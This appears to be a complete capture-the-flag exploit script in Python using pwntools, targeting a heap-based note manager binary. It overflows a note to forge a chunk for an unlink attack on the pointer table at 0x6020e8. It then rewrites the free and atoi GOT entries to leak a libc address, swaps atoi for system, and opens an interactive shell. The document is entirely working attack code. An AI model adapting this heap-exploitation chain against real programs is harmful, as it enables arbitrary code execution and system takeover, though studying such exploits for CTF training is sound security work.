from parse_args_and_some_func import *

filename = all_parsed_args['filename']
assert filename is not None
io = all_parsed_args['io']
# io = process()

def new_note(size:int, content:(str, bytes)):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:(less than 1024)\n", str(size))
    io.sendlineafter("Input the note content:\n", content)
    return io.recvline()

def show_note():
    io.sendlineafter('option--->>\n', '2')


def edit_note(idx:int, content:(str, bytes)):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id of the note:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvuntil("Edit success\n")


def delete_note(idx:int):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id of the note:\n", str(idx))

# 0x400c61
new_note(0x10, 'aaaa') # 0
new_note(0x10, 'aaaa') # 1
new_note(0x10, 'aaaa') # 2
new_note(0x10, 'aaaa') # 3
new_note(0x100, 'aaaa') # 4 # 0x6020e8
new_note(0x100, 'aaaa') # 5
new_note(0x10, 'aaaa') # 6
new_note(0x10, 'aaaa') # 7

payload = b'a' * 0x80 + p64(0)+ p64(0x101)+ p64(0x6020e8 - 0x18) + p64(0x6020e8 - 0x10) + 0xe0 * b'a' + p64(0x100) + p64(0x110)
edit_note(0, payload)

delete_note(5)

# free@got 0x602018 atoi@got 0x602070
edit_note(4, p64(0x602018) + p64(0x602070) * 2)
STOP()
edit_note(1, p64(0x400730)[:6])
STOP()
delete_note(2)

atoi_addr = io.recvline()
atoi_addr = u64(atoi_addr[:-1] + b'\x00\x00')
LOG_ADDR("atoi_addr", atoi_addr)

system_addr = atoi_addr + 0xe510

edit_note(3, p64(system_addr)[:7])


io.interactive()
